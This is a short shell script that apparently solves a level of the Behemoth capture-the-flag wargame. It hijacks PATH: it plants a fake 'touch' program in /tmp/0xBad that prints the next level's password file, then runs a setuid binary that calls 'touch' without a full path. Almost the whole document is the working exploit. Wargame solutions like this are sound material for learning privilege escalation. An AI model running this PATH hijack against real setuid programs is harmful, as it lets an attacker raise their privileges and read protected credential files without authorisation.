#touch is being called not from /usr/bin/touch
#we can fool it to run our touch program be cause the system will first check in PATH variable 
mkdir /tmp/0xBad
cd /tmp/0xBad
echo "cat /etc/behemoth_pass/behemoth3" > touch
chmod +x touch
export PATH=/tmp/0xBad/:$PATH
/behemoth/behemoth2